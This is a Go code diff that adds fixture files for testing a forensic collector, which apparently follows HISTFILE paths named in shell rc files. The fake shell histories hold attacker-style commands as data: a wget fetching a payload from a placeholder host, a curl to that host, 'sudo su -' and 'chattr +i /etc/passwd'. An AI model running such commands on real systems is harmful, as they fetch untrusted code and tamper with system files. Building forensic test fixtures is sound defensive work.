@@ -64,6 +64,25 @@ func Build(root string) error {
 		return err
 	}
 
+	// Shell rc files naming a HISTFILE elsewhere: the two-phase artifacts have
+	// to read these, extract the path, then collect what it points at.
+	if err := write("home/alice/.bashrc", "export PS1='$ '\nHISTFILE=~/.hidden_history\nexport HISTSIZE=1000\n", 0644); err != nil {
+		return err
+	}
+	if err := write("home/alice/.hidden_history", "sudo su -\nwget http://example.invalid/payload\n", 0600); err != nil {
+		return err
+	}
+	if err := write("root/.bashrc", "HISTFILE=/var/log/root_history\n", 0644); err != nil {
+		return err
+	}
+	if err := write("var/log/root_history", "id\nchattr +i /etc/passwd\n", 0600); err != nil {
+		return err
+	}
+	// A HISTFILE that points nowhere: recorded, not collected, not fatal.
+	if err := write("home/bob/.bashrc", "HISTFILE=~/.no_such_history\n", 0644); err != nil {
+		return err
+	}
+
 	// Shell histories and SSH material: the bread-and-butter file artifacts.
 	if err := write("root/.bash_history", "whoami\nid\ncurl http://example.invalid/x\n", 0600); err != nil {
 		return err
